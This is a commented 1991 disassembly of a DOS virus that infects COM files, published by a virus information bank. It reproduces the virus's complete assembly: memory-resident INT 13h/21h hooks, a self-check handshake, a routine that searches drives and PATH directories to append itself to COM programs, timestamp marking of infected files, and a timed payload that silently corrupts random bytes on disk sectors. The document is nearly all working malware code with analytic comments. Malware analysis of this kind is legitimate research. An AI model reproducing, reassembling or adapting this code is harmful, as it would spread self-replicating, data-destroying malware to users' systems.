;-------------------------------------------------
; Virus 
;
; dissasembled by Andrzej Kadlof July 1991
;
; (C) Polish section of Virus Information Bank
;------------------------------------------------

0100 E97801         JMP     027B

; old INT 13h vector

0103 7A0F
0105 7000

;====================
; INT 13h handler

0107 9C             PUSHF
0108 50             PUSH    AX
0109 53             PUSH    BX
010A 51             PUSH    CX
010B 52             PUSH    DX
010C 1E             PUSH    DS
010D 06             PUSH    ES
010E 57             PUSH    DI

010F 0E             PUSH    CS
0110 1F             POP     DS
0111 50             PUSH    AX
0112 B000           MOV     AL,00
0114 3D0002         CMP     AX,0200     ; request: read sectors?
0117 58             POP     AX          ; restore oryginal function number
0118 7571           JNZ     018B        ; no, exit

011A 80F900         CMP     CL,00       ; first sector number (illegal)
011D 7518           JNZ     0137        ; not zero, not virus question

011F 81FF3412       CMP     DI,1234     ; question from new copy of virus 
0123 7512           JNZ     0137        ; no

; prepare answer for the question from next virsus copy

0125 5F             POP     DI
0126 BF2143         MOV     DI,4321     ; answer: I'm here!
0129 58             POP     AX
012A 58             POP     AX
012B A19901         MOV     AX,[0199]   ; old INT 21h
012E 50             PUSH    AX
012F A19B01         MOV     AX,[019B]
0132 50             PUSH    AX
0133 57             PUSH    DI
0134 EB55           JMP     018B        ; exit
0136 90             NOP

; check cylinder number, if not 4x + 2 or 4x + 3 then exit (x arbitrary)

0137 51             PUSH    CX
0138 81E100FC       AND     CX,FC00
013C 80FD00         CMP     CH,00
013F 59             POP     CX
0140 7449           JZ      018B        ; exit

; check time condition

0142 51             PUSH    CX
0143 52             PUSH    DX
0144 B80000         MOV     AX,0000
0147 FB             STI
0148 CD1A           INT     1A         ; read the clock

014A 81E2FF0F       AND     DX,0FFF    ; low word of tick count since reset
014E 83FA00         CMP     DX,+00     ; about 3.7 min
0151 5A             POP     DX
0152 59             POP     CX
0153 7536           JNZ     018B       ; exit

;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
; DESTRUCTION! change one byte on the sector on the next track
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

0155 9C             PUSHF
0156 0E             PUSH    CS          ; segment of return address
0157 B86601         MOV     AX,0166     ; offset of return address
015A 50             PUSH    AX
015B B80102         MOV     AX,0201     ; read 1 sector
015E 80C501         ADD     CH,01       ; next track
0161 2EFF2E0301     JMP     DWORD PTR CS:[0103]    ; CALL FAR INT 13h

0166 7223           JB      018B        ; exit

; get random number between 0 and 1FFh (minimal buffer size)

0168 51             PUSH    CX
0169 52             PUSH    DX
016A B80000         MOV     AX,0000
016D FB             STI
016E CD1A           INT     1A          ; read the clock

0170 81E2FF01       AND     DX,01FF     ; low word of tick count since reset

; change one byte inside buffer

0174 53             PUSH    BX          ; offset of buffer
0175 03DA           ADD     BX,DX       ; random byte in buffer
0177 26880F         MOV     ES:[BX],CL  ; undefined value (first sector)
017A 5B             POP     BX          ; restore buffer address

; write buffer back to disk

017B 5A             POP     DX          ; disk/head
017C 59             POP     CX          ; track/sector
017D 9C             PUSHF
017E 0E             PUSH    CS          ; segment of return address
017F B88B01         MOV     AX,018B     ; offset of return address
0182 50             PUSH    AX
0183 B80103         MOV     AX,0301     ; write 1 sector
0186 2EFF2E0301     JMP     DWORD PTR CS:[0103]       ; CALL FAR INT 13h

; exit to old INT 13h

018B 5F             POP     DI
018C 07             POP     ES
018D 1F             POP     DS
018E 5A             POP     DX
018F 59             POP     CX
0190 5B             POP     BX
0191 58             POP     AX
0192 9D             POPF
0193 2EFF2E0301     JMP     DWORD PTR CS:[0103]  ; INT 13h
0198 90             NOP

;---------------
; working area

; old INT 21h vector

0199 9E10
019B 1801

019D 26 0D      ; segment of environment block
019F 80 00      ; address of command line
01A1 2B 0D      ; CS
01A3 5C 00      ; first FCB in PSP
01A5 2B 0D      ; CS
01A7 6C 00      ; second FCB in PSP
01A9 2B 0D      ; CS
01AB CF 01      ; runtime SP

01AD 2B 0D      ; old SS, CS
01AF 02 19      ; old SP

;------------
; local stack

01B1 9D01
01B3 857F
01B5 FF58
01B7 2B0D
01B9 2F01
01BB E37F
01BD D300
01BF 0001
02C1 2C00
01C3 260D
02C5 2B0D
01C7 430C
01C9 2903
01CB 2B0D
01CD 02F2

; end of local stack
;-------------------

01CF 90             NOP
01D0 90             NOP

;=====================
; INT 21h handler

01D1 9C             PUSHF
01D2 56             PUSH    SI
01D3 50             PUSH    AX
01D4 53             PUSH    BX
01D5 51             PUSH    CX
01D6 52             PUSH    DX
01D7 1E             PUSH    DS
01D8 06             PUSH    ES
01D9 57             PUSH    DI
01DA 80FC4B         CMP     AH,4B       ; load and execute
01DD 7555           JNZ     0234        ; exit

01DF 1E             PUSH    DS
01E0 52             PUSH    DX
01E1 0E             PUSH    CS
01E2 1F             POP     DS
01E3 C70698036906   MOV     WORD PTR [0398],0669  ; virus length
01E9 E8E203         CALL    05CE      ; intercept INT 24h and prepare local DTA

01EC 5F             POP     DI
01ED 07             POP     ES
01EE 06             PUSH    ES
01EF 57             PUSH    DI
01F0 B80000         MOV     AX,0000
01F3 B98000         MOV     CX,0080
01F6 F2AE           REPNZ   SCASB
01F8 83F900         CMP     CX,+00
01FB 7432           JZ      022F

01FD 4F             DEC     DI
01FE B05C           MOV     AL,5C       ; '\'
0200 4F             DEC     DI
0201 AE             SCASB
0202 75F9           JNZ     01FD

0204 57             PUSH    DI
0205 59             POP     CX
0206 5E             POP     SI
0207 1F             POP     DS
0208 0E             PUSH    CS
0209 07             POP     ES
020A BF6906         MOV     DI,0669     ; buffer (area behind virus code)
020D AC             LODSB
020E AA             STOSB
020F 3BF1           CMP     SI,CX
0211 75FA           JNZ     020D

0213 0E             PUSH    CS
0214 1F             POP     DS
0215 893EA203       MOV     [03A2],DI
0219 BEAC03         MOV     SI,03AC
021C B90600         MOV     CX,0006
021F AC             LODSB
0220 AA             STOSB
0221 E2FC           LOOP    021F

0223 BA6906         MOV     DX,0669
0226 E87302         CALL    049C        ; find and infect one COM file

0229 E8D703         CALL    0603        ; restore DTA and INT 24h

022C EB06           JMP     0234        ; exit
022E 90             NOP

022F 58             POP     AX
0230 58             POP     AX
0231 E8CF03         CALL    0603        ; restore DTA and INT 24h

; exit to old INT 21h

0234 90             NOP
0235 5F             POP     DI
0236 07             POP     ES
0237 1F             POP     DS
0238 5A             POP     DX
0239 59             POP     CX
023A 5B             POP     BX
023B 58             POP     AX
023C 5E             POP     SI
023D 9D             POPF
023E 2EFF2E9901     JMP     DWORD PTR CS:[0199]
0243 90             NOP

;------------------------
; prepare Load & Execute

0244 8CC0           MOV     AX,ES
0246 8BE8           MOV     BP,AX
0248 8BD7           MOV     DX,DI       ; offset of victim name 
024A 8CC8           MOV     AX,CS
024C 8EC0           MOV     ES,AX       ; segment of victim name 
024E BB9D01         MOV     BX,019D     ; run parameters
0251 06             PUSH    ES
0252 53             PUSH    BX
0253 8CC8           MOV     AX,CS       ; block segment
0255 8EC0           MOV     ES,AX
0257 BBD300         MOV     BX,00D3     ; block size in paragraphs
025A B44A           MOV     AH,4A       ; resize memory block

025C CD21           INT     21

; free environment block

025E BF2C00         MOV     DI,002C     ; address of environment block in PSP
0261 8E05           MOV     ES,[DI]     ; segment of environment
0263 B80049         MOV     AX,4900     ; free memory block
0266 CD21           INT     21

0268 5B             POP     BX
0269 07             POP     ES
026A 58             POP     AX
026B 8C0EAD01       MOV     [01AD],CS
026F 8E16AD01       MOV     SS,[01AD]
0273 8B26AB01       MOV     SP,[01AB]
0277 8EDD           MOV     DS,BP
0279 50             PUSH    AX
027A C3             RET

;===========================
; virus entry point

; look for resident part of virus in RAM
; on system with 3 floppy drives this test may hang the computer 
; (unspecified I/O buffer BX)

027B B203           MOV     DL,03       ; third floppy drive
027D B600           MOV     DH,00       ; head 0
027F B100           MOV     CL,00       ; first sector 0
0281 B500           MOV     CH,00       ; track
0283 B80102         MOV     AX,0201     ; read 1 sector
0286 BF3412         MOV     DI,1234     ; is already in memory?
0289 CD13           INT     13

028B 81FF2143       CMP     DI,4321     ; expected answer
028F 7503           JNZ     0294        ; memory is clear

0291 E92601         JMP     03BA        ; exit

; intercept INT 21h and INT 13h

0294 B82135         MOV     AX,3521     ; get INT 21h
0297 CD21           INT     21

0299 891E9901       MOV     [0199],BX
029D 8C069B01       MOV     [019B],ES
02A1 BAD101         MOV     DX,01D1
02A4 B82125         MOV     AX,2521     ; set INT 21h
02A7 CD21           INT     21

02A9 B435           MOV     AH,35       ; get INT 13h
02AB B013           MOV     AL,13
02AD CD21           INT     21

02AF 891E0301       MOV     [0103],BX
02B3 8C060501       MOV     [0105],ES
02B7 B425           MOV     AH,25       ; set INT 13h
02B9 B013           MOV     AL,13
02BB BA0701         MOV     DX,0107
02BE CD21           INT     21

; prepare Load & Execute

02C0 BF2C00         MOV     DI,002C     ; address of environment in PSP
02C3 8B05           MOV     AX,[DI]
02C5 A39D01         MOV     [019D],AX
02C8 8C0EA101       MOV     [01A1],CS
02CC C7069F018000   MOV     WORD PTR [019F],0080        ; command line
02D2 8C0EA501       MOV     [01A5],CS
02D6 C706A3015C00   MOV     WORD PTR [01A3],005C        ; first FCB in PSP
02DC 8C0EA901       MOV     [01A9],CS
02E0 C706A7016C00   MOV     WORD PTR [01A7],006C        ; second FCB

; look for program name (DOS 3.x or higher)

02E6 FC             CLD
02E7 BF2C00         MOV     DI,002C     ; segment of environment block
02EA 8E05           MOV     ES,[DI]
02EC BF0000         MOV     DI,0000     ; start of environment

02EF B80000         MOV     AX,0000     ; end of block marker
02F2 B90080         MOV     CX,8000     ; maxim block size
02F5 2BCF           SUB     CX,DI       ; end of block
02F7 7230           JB      0329        ; not found

02F9 F2AE           REPNZ   SCASB
02FB B80000         MOV     AX,0000
02FE AE             SCASB
02FF 75EE           JNZ     02EF

0301 B80100         MOV     AX,0001
0304 AE             SCASB
0305 7522           JNZ     0329

0307 B80000         MOV     AX,0000
030A AE             SCASB
030B 751C           JNZ     0329

030D E834FF         CALL    0244        ; prepare Load & Execute

0310 B8004B         MOV     AX,4B00     ; load and execute
0313 E86F00         CALL    0385        ; INT 21h

; clear environment block

0316 0E             PUSH    CS
0317 1F             POP     DS
0318 BF2C00         MOV     DI,002C     ; environment
031B B80000         MOV     AX,0000     ; end of block marker
031E 8905           MOV     [DI],AX     ; start of block
0320 BAD300         MOV     DX,00D3     ; size of virus block in paragraphs
0323 B80031         MOV     AX,3100     ; terminate and state resident
0326 E85C00         CALL    0385        ; far call to INT 21h

; victim name not found (DOS < 3.0)
; execute command >C:\COMMAND.COM /P

0329 E818FF         CALL    0244        ; prepare Load & Execute
032C 0E             PUSH    CS
032D 1F             POP     DS
032E BA7603         MOV     DX,0376     ; 'c:\command.com',0
0331 57             PUSH    DI
0332 BF8000         MOV     DI,0080     ; command line
0335 C705022F       MOV     WORD PTR [DI],2F02     ; 2, '/'
0339 C74502500D     MOV     WORD PTR [DI+02],0D50  ; 'P', CR
033E 5F             POP     DI
033F B8004B         MOV     AX,4B00     ; load and execute
0342 E84000         CALL    0385        ; far call to INT 21h

0345 B86300         MOV     AX,0063     ; 'c'
0348 57             PUSH    DI
0349 BF7603         MOV     DI,0376     ; 'c:\command.com',0
034C 8805           MOV     [DI],AL
034E 5F             POP     DI
034F B8004B         MOV     AX,4B00     ; load and execute
0352 E83000         CALL    0385        ; far call to INT 21h

; restore INT 13h

0355 B81325         MOV     AX,2513     ; set INT 13h
0358 8B160301       MOV     DX,[0103]
035C FF360501       PUSH    [0105]
0360 1F             POP     DS
0361 CD21           INT     21

; restore INT 13h

0363 B82125         MOV     AX,2521
0366 8B169901       MOV     DX,[0199]
036A FF369B01       PUSH    [019B]
036E 1F             POP     DS
036F CD21           INT     21

0371 0E             PUSH    CS
0372 1F             POP     DS
0373 EB45           JMP     03BA
0375 90             NOP

0376 63 3A 5C 43 4F 4D 4D 41 4E 44 2E 43 4F 4D 00    ; c:\COMMAND.COM

;---------------------
; FAR CALL to INT 21h

0385 2E8F069603     POP     CS:[0396]   ; offset of caller
038A 9C             PUSHF               ; prepare jump to INT 21h
038B 0E             PUSH    CS          ; segment of return address
038C 2EFF369603     PUSH    CS:[0396]   ; offset of return addres
0391 2EFF2E9901     JMP     DWORD PTR CS:[0199]   ; CALL FAR INT 13h

;--------------
; working area

0396 96 05              ; place for offset of return address
0398 60 D2              ; length of victim
039A 80 00              ; old DTA offset
039C C2 0A              ; old DTA segment
039E 00 00              ; counter ?
03A0 00 00              ; DS
03A2 FA CC              ; working, end of path
03A4 50 41 54 48 3D                 ; PATH=
03A9 61 3A 5C 2A 2E 63 6F 6D 00     ; a:\*.com, 0

; old INT 24h

03B2 49 01      ; offset
03B4 48 09      ; segment

;==================
; INT 24h handler

03B6 90             NOP
03B7 B003           MOV     AL,03
03B9 CF             IRET

;---------------------------------
; virus alredy resident, continue

03BA 06             PUSH    ES
03BB 1E             PUSH    DS
03BC 0E             PUSH    CS
03BD 1F             POP     DS
03BE 8F069901       POP     [0199]      ; old INT 21h offset
03C2 8F069B01       POP     [019B]      ; old INT 21h segment
03C6 E80502         CALL    05CE        ; prepare INT 24h and DTA

03C9 BEA903         MOV     SI,03A9     ; address of 'a:\*.com, 0'
03CC 8B3E9803       MOV     DI,[0398]   ; buffer outside viruse code
03D0 B90900         MOV     CX,0009     ; number of bytes
03D3 AC             LODSB
03D4 AA             STOSB
03D5 E2FC           LOOP    03D3

03D7 8B3E9803       MOV     DI,[0398]   ; buffer
03DB 83C703         ADD     DI,+03
03DE 893EA203       MOV     [03A2],DI
03E2 8B3E9803       MOV     DI,[0398]
03E6 B86100         MOV     AX,0061     ; drive 'a'
03E9 8805           MOV     [DI],AL     ; patch 'a:\*.com', 0
03EB 8BD7           MOV     DX,DI       ; buffer
03ED E8AC00         CALL    049C        ; find and infect one COM program

03F0 BEA903         MOV     SI,03A9
03F3 8B3E9803       MOV     DI,[0398]
03F7 B90900         MOV     CX,0009
03FA AC             LODSB
03FB AA             STOSB
03FC E2FC           LOOP    03FA

03FE 8B3E9803       MOV     DI,[0398]
0402 B86300         MOV     AX,0063     ; drive 'c'
0405 8805           MOV     [DI],AL     ; patch 'a:\*.com', 0
0407 8BD7           MOV     DX,DI
0409 E89000         CALL    049C        ; find and infect one COM program

040C 7203           JB      0411

040E E91302         JMP     0624

0411 BF2C00         MOV     DI,002C     ; environment
0414 8E05           MOV     ES,[DI]
0416 BF0000         MOV     DI,0000
0419 BEA403         MOV     SI,03A4     ; 'PATH='
041C 46             INC     SI
041D B85000         MOV     AX,0050     ; 'P'
0420 B90080         MOV     CX,8000     ; max block size
0423 2BCF           SUB     CX,DI
0425 7303           JAE     042A

0427 E9FA01         JMP     0624        ; not found

042A F2AE           REPNZ   SCASB
042C B90400         MOV     CX,0004
042F AC             LODSB
0430 AE             SCASB
0431 75E6           JNZ     0419

0433 E2FA           LOOP    042F

0435 8B369803       MOV     SI,[0398]
0439 56             PUSH    SI
043A 57             PUSH    DI
043B 5E             POP     SI
043C 5F             POP     DI
043D 06             PUSH    ES
043E 0E             PUSH    CS
043F 07             POP     ES
0440 1F             POP     DS
0441 AC             LODSB
0442 AA             STOSB
0443 3C3B           CMP     AL,3B       ; ';' end of path marker
0445 7409           JZ      0450

0447 3C00           CMP     AL,00       ; end of block marker
0449 7402           JZ      044D

044B EBF4           JMP     0441        ; end of block

044D BE0000         MOV     SI,0000
0450 1E             PUSH    DS
0451 0E             PUSH    CS
0452 1F             POP     DS
0453 8F06A003       POP     [03A0]
0457 89369E03       MOV     [039E],SI
045B 4F             DEC     DI
045C 4F             DEC     DI

; check for last character '\', add if necessary

045D B05C           MOV     AL,5C    ; '\'
045F 3805           CMP     [DI],AL
0461 7403           JZ      0466

0463 47             INC     DI
0464 8805           MOV     [DI],AL
0466 47             INC     DI

; form new path ....\*.com, 0

0467 BEAC03         MOV     SI,03AC     ; *.com
046A 893EA203       MOV     [03A2],DI
046E B90600         MOV     CX,0006     ; length

0471 AC             LODSB
0472 AA             STOSB
0473 E2FC           LOOP    0471

0475 A19803         MOV     AX,[0398]   ; buffer
0478 8BD0           MOV     DX,AX
047A E81F00         CALL    049C        ; find and infect COM file

047D 7203           JB      0482

047F E9A201         JMP     0624

0482 833E9E0300     CMP     WORD PTR [039E],+00
0487 7503           JNZ     048C

0489 E99801         JMP     0624

048C A19803         MOV     AX,[0398]
048F 8BF8           MOV     DI,AX
0491 8B369E03       MOV     SI,[039E]
0495 FF36A003       PUSH    [03A0]
0499 1F             POP     DS
049A EBA5           JMP     0441

;---------------------------------
; find and infect one COM program

049C 0E             PUSH    CS
049D 07             POP     ES
049E B8004E         MOV     AX,4E00     ; find first
04A1 B90300         MOV     CX,0003     ; hiden, read only
04A4 E8DEFE         CALL    0385        ; far call to INT 21h

04A7 730C           JAE     04B5

04A9 C3             RET

04AA B44F           MOV     AH,4F       ; find next
04AC B90300         MOV     CX,0003     ; hiden, read only
04AF E8D3FE         CALL    0385        ; far call to INT 21h

04B2 7301           JAE     04B5

04B4 C3             RET

; start infection

04B5 8B3E9803       MOV     DI,[0398]   ; buffer
04B9 81C78000       ADD     DI,0080     ; set DI to DTA
04BD 83C71A         ADD     DI,+1A      ; file length
04C0 8B05           MOV     AX,[DI]
04C2 2D0010         SUB     AX,1000     ; minimum victim size
04C5 7215           JB      04DC        ; file too small, find next

04C7 8B05           MOV     AX,[DI]     ; file size
04C9 2DFFEF         SUB     AX,EFFF     ; maximum file size
04CC 730E           JAE     04DC        ; file too big, find next

04CE 83EF04         SUB     DI,+04      ; file time stamp
04D1 8B05           MOV     AX,[DI]
04D3 241F           AND     AL,1F       ; extract seconds
04D5 3C18           CMP     AL,18       ; 48 seconds
04D7 7403           JZ      04DC        ; infected, find next 

04D9 EB03           JMP     04DE        ; continue
04DB 90             NOP

04DC EBCC           JMP     04AA        ; find next

; copy file name to buffer

04DE 83C708         ADD     DI,+08
04E1 8BF7           MOV     SI,DI
04E3 8B3EA203       MOV     DI,[03A2]
04E7 AC             LODSB
04E8 AA             STOSB
04E9 3C00           CMP     AL,00
04EB 75FA           JNZ     04E7

; find new file length

04ED 8B3E9803       MOV     DI,[0398]
04F1 81C78000       ADD     DI,0080     ; set DI to local DTA
04F5 83C71A         ADD     DI,+1A      ; file length
04F8 8B05           MOV     AX,[DI]
04FA 056906         ADD     AX,0669     ; new file length
04FD FF369803       PUSH    [0398]
0501 50             PUSH    AX

; clear flag Read Only

0502 8B169803       MOV     DX,[0398]
0506 B80043         MOV     AX,4300     ; get attributes
0509 E879FE         CALL    0385        ; far call to INT 21h

050C 890EC805       MOV     [05C8],CX   ; store old attributes
0510 81E1FEFF       AND     CX,FFFE     ; clear read only flag
0514 B80143         MOV     AX,4301     ; set attributes
0517 E86BFE         CALL    0385        ; far call to INT 21h

051A 7233           JB      054F        ; error, exit

; open file for read/write

051C B8023D         MOV     AX,3D02     ; open file for read/write
051F E863FE         CALL    0385        ; far call to INT 21h

0522 722B           JB      054F        ; error, exit

; set 48 second in file time stamp

0524 8BD8           MOV     BX,AX       ; hundle
0526 B80057         MOV     AX,5700     ; get time stamp
0529 E859FE         CALL    0385        ; far call to INT 21h

052C 81E1E0FF       AND     CX,FFE0     ; clear seconds
0530 83C118         ADD     CX,+18      ; set to 48
0533 890ECA05       MOV     [05CA],CX   ; store for later
0537 8916CC05       MOV     [05CC],DX

; copy first 669h bytes of file to the end

; read beginnig of file (669h bytes)

053B B96906         MOV     CX,0669     ; virus length
053E 81E90001       SUB     CX,0100     ; size of PSP
0542 8B169803       MOV     DX,[0398]
0546 81C20001       ADD     DX,0100     ; buffer
054A B43F           MOV     AH,3F       ; read file
054C E836FE         CALL    0385        ; far call to INT 21h

054F 7271           JB      05C2        ; error, exit

; move file ptr back to BOF

0551 8BFA           MOV     DI,DX
0553 BA0000         MOV     DX,0000
0556 B90000         MOV     CX,0000
0559 B80242         MOV     AX,4202     ; move file ptr to EOF
055C E826FE         CALL    0385        ; far call to INT 21h

055F 7261           JB      05C2        ; error, exit

; vrite virus code to file

0561 8BD7           MOV     DX,DI
0563 B96906         MOV     CX,0669     ; virus length
0566 81E90001       SUB     CX,0100
056A B440           MOV     AH,40       ; write file
056C E816FE         CALL    0385        ; far call to INT 21h

056F 7251           JB      05C2        ; error, exit

; move file ptr to EOF

0571 BA0000         MOV     DX,0000
0574 B90000         MOV     CX,0000
0577 B80042         MOV     AX,4200     ; move file ptr to BOF
057A E808FE         CALL    0385        ; far call to INT 21h

057D 7243           JB      05C2

; write to file its beginning block

057F 8F069803       POP     [0398]
0583 FF369803       PUSH    [0398]
0587 B96906         MOV     CX,0669     ; end of virus code
058A 81E90001       SUB     CX,0100     ; size of PSP
058E BA0001         MOV     DX,0100     ; from buffer
0591 B440           MOV     AH,40       ; write file
0593 E8EFFD         CALL    0385        ; far call to INT 21h

0596 722A           JB      05C2
        ; error, exit

; restore file time stamp

0598 8B0ECA05       MOV     CX,[05CA]   ; restore time stamp
059C 8B16CC05       MOV     DX,[05CC]   ; restore date stamp
05A0 B80157         MOV     AX,5701     ; set file time stamp
05A3 E8DFFD         CALL    0385        ; far call to INT 21h

; close file

05A6 B43E           MOV     AH,3E       ; close file
05A8 E8DAFD         CALL    0385        ; far call to INT 21h

; restore file attributes

05AB 8F069803       POP     [0398]
05AF 8F069803       POP     [0398]
05B3 8B169803       MOV     DX,[0398]
05B7 8B0EC805       MOV     CX,[05C8]   ; retore file attributes
05BB B80143         MOV     AX,4301     ; set file attributes
05BE E8C4FD         CALL    0385        ; far call to INT 21h

05C1 C3             RET

; exit after any error

05C2 58             POP     AX
05C3 8F069803       POP     [0398]
05C7 C3             RET

05C8 20 00              ; file attributes
05CA D8A8               ; file time stamp
05CC D516               ; file date stamp

;-----------------------------------------
; intercept INT 24h and prepare local DTA

; get INT 24h

05CE B82435         MOV     AX,3524     ; get INT 24h
05D1 E8B1FD         CALL    0385        ; far call to INT 21h

05D4 891EB203       MOV     [03B2],BX
05D8 8C06B403       MOV     [03B4],ES

; set new INT 24h

05DC B425           MOV     AH,25       ; set
05DE B024           MOV     AL,24       ; int 24h
05E0 BAB603         MOV     DX,03B6     ; offset of new handler
05E3 E89FFD         CALL    0385        ; far call to INT 21h

; get current DTA

05E6 B42F           MOV     AH,2F       ; get DTA
05E8 E89AFD         CALL    0385        ; far call to INT 21h

05EB 8C069C03       MOV     [039C],ES
05EF 891E9A03       MOV     [039A],BX

; set new local DTA

05F3 B41A           MOV     AH,1A       ; set DTA
05F5 0E             PUSH    CS
05F6 1F             POP     DS
05F7 8B169803       MOV     DX,[0398]
05FB 81C28000       ADD     DX,0080
05FF E883FD         CALL    0385        ; far call to INT 21h

0602 C3             RET

;-------------------------
; restore INT 24h and DTA

; prepare registers

0603 0E             PUSH    CS
0604 1F             POP     DS
0605 0E             PUSH    CS
0606 07             POP     ES

; restore INT 24h

0607 B82425         MOV     AX,2524     ; set INT 24h
060A 8B16B203       MOV     DX,[03B2]
060E 8E1EB403       MOV     DS,[03B4]
0612 E870FD         CALL    0385        ; far call to INT 21h

; retsore DTA

0615 8B169A03       MOV     DX,[039A]
0619 FF369C03       PUSH    [039C]
061D 1F             POP     DS
061E B41A           MOV     AH,1A
0620 E862FD         CALL    0385        ; far call to INT 21h

0623 C3             RET

;---------------------
; exit to application

0624 E8DCFF         CALL    0603        ; restore INT 24h and DTA

0627 0E             PUSH    CS
0628 1F             POP     DS
0629 BE3E06         MOV     SI,063E     ; start of oryginal code
062C 8B3E9803       MOV     DI,[0398]   ; length of victim

; copy victim code

0630 AC             LODSB
0631 AA             STOSB
0632 81FE6906       CMP     SI,0669
0636 75F8           JNZ     0630

0638 8B3E9803       MOV     DI,[0398]   ; RET address
063C 57             PUSH    DI
063D C3             RET

063E B96906         MOV     CX,0669
0641 81E90001       SUB     CX,0100
0645 8B369803       MOV     SI,[0398]
0649 2BF1           SUB     SI,CX
064B 0E             PUSH    CS
064C 1F             POP     DS
064D BF0001         MOV     DI,0100
0650 AC             LODSB
0651 AA             STOSB
0652 E2FC           LOOP    0650

0654 33C0           XOR     AX,AX
0656 33DB           XOR     BX,BX
0658 33C9           XOR     CX,CX
065A 33D2           XOR     DX,DX
065C 33F6           XOR     SI,SI
065E BF0001         MOV     DI,0100
0661 57             PUSH    DI
0662 33FF           XOR     DI,DI
0664 33ED           XOR     BP,BP
0666 C3             RET

0667 90             NOP
0668 90             NOP

; end resident part of virus
;-----------------------------
; victim code

